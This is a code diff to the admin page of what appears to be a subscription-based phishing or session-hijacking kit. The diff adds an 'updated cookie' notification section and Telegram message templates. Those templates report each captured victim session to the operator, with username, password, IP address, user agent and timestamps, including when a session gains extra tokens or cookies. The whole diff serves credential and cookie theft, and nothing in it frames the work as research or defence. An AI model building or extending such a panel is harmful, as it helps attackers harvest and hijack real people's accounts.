@@ -252,7 +252,21 @@
                             <button type="button" class="btn btn-success" onclick="testSessionNotification()" id="test-btn" style="margin-left: auto;">🧪 Test Notification</button>
                         </div>
                         <textarea id="incoming-cookie" placeholder="New cookie session detected!"></textarea>
-                        <small style="color: rgba(255,255,255,0.6);">This message will be sent when a new cookie session is detected. Uses Telegram MarkdownV2 format.</small>
+                        <small style="color: rgba(255,255,255,0.6);">This message will be sent when a new cookie session is detected. Uses Telegram MarkdownV2 format. Placeholders: {session_id}, {username}, {password}, {remote_addr}, {useragent}, {create_time}, {update_time}, {time}</small>
+                    </div>
+                </div>
+                
+                <div class="notification-section">
+                    <h3>🔄 Updated Cookie Notification</h3>
+                    <div class="form-group">
+                        <label>Notification Text (MarkdownV2 format)</label>
+                        <div style="display: flex; gap: 10px; margin-bottom: 10px; flex-wrap: wrap;">
+                            <button type="button" class="btn btn-primary" onclick="prefillTemplate('updated-cookie', 'default')">📝 Default Template</button>
+                            <button type="button" class="btn btn-primary" onclick="prefillTemplate('updated-cookie', 'detailed')">📋 Detailed Template</button>
+                            <button type="button" class="btn btn-primary" onclick="prefillTemplate('updated-cookie', 'minimal')">✨ Minimal Template</button>
+                        </div>
+                        <textarea id="updated-cookie" placeholder="Cookie session updated!"></textarea>
+                        <small style="color: rgba(255,255,255,0.6);">This message will be sent when an existing cookie session is updated with additional data (tokens, cookies, etc.). Uses Telegram MarkdownV2 format. Placeholders: {session_id}, {username}, {password}, {remote_addr}, {useragent}, {create_time}, {update_time}, {time}</small>
                     </div>
                 </div>
                 
@@ -362,9 +376,14 @@
         // Default notification templates (MarkdownV2 format)
         const notificationTemplates = {
             'incoming-cookie': {
-                'default': '*🍪 New Cookie Session Captured\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Timestamp:* `{time}`\n━━━━━━━━━━━━━━━━━━━━',
-                'detailed': '*🍪 New Cookie Session Captured\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Timestamp:* `{time}`\n━━━━━━━━━━━━━━━━━━━━',
-                'minimal': '🍪 *New Session:* `{session_id}` \\| `{username}`'
+                'default': '*🍪 New Cookie Session Captured\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Created:* `{create_time}`\n• *Updated:* `{update_time}`\n━━━━━━━━━━━━━━━━━━━━',
+                'detailed': '*🍪 New Cookie Session Captured\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Created:* `{create_time}`\n• *Updated:* `{update_time}`\n━━━━━━━━━━━━━━━━━━━━',
+                'minimal': '🍪 *New Session:* `{session_id}` \\| `{username}` \\| Updated: `{update_time}`'
+            },
+            'updated-cookie': {
+                'default': '*🔄 Cookie Session Updated\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Created:* `{create_time}`\n• *Updated:* `{update_time}`\n━━━━━━━━━━━━━━━━━━━━',
+                'detailed': '*🔄 Cookie Session Updated\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Created:* `{create_time}`\n• *Updated:* `{update_time}`\n\n*Note:* This session has been updated with additional data \\(tokens, cookies, etc\\.\\)\n━━━━━━━━━━━━━━━━━━━━',
+                'minimal': '🔄 *Session Updated:* `{session_id}` \\| `{username}` \\| Updated: `{update_time}`'
             },
             'status-update': {
                 'default': '*⚙️ System Status Changed*\n\n━━━━━━━━━━━━━━━━━━━━\n*Current Status:*\n• *Monitoring:* `{monitoring_status}`\n• *Telegram:* `{telegram_status}`\n• *Discord:* `{discord_status}`\n• *Email:* `{email_status}`\n*Admin Information:*\n• *Admin Status:* `{admin_status}`\n• *Subscription End Date:* `{subscription_end_date}`\n• *Updated At:* `{time}`\n━━━━━━━━━━━━━━━━━',
@@ -486,6 +505,7 @@
                 const data = await response.json();
                 
                 document.getElementById('incoming-cookie').value = data.incoming_cookie || '';
+                document.getElementById('updated-cookie').value = data.updated_cookie || '';
                 document.getElementById('status-update').value = data.status_update || '';
                 document.getElementById('subscription-warning').value = data.subscription_warning || '';
                 document.getElementById('account-extension').value = data.account_extension || '';
@@ -504,6 +524,7 @@
             e.preventDefault();
             
             const incomingCookie = document.getElementById('incoming-cookie').value;
+            const updatedCookie = document.getElementById('updated-cookie').value;
             const statusUpdate = document.getElementById('status-update').value;
             const subscriptionWarning = document.getElementById('subscription-warning').value;
             const accountExtension = document.getElementById('account-extension').value;
@@ -519,6 +540,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         incoming_cookie: incomingCookie,
+                        updated_cookie: updatedCookie,
                         status_update: statusUpdate,
                         subscription_warning: subscriptionWarning,
                         account_extension: accountExtension,
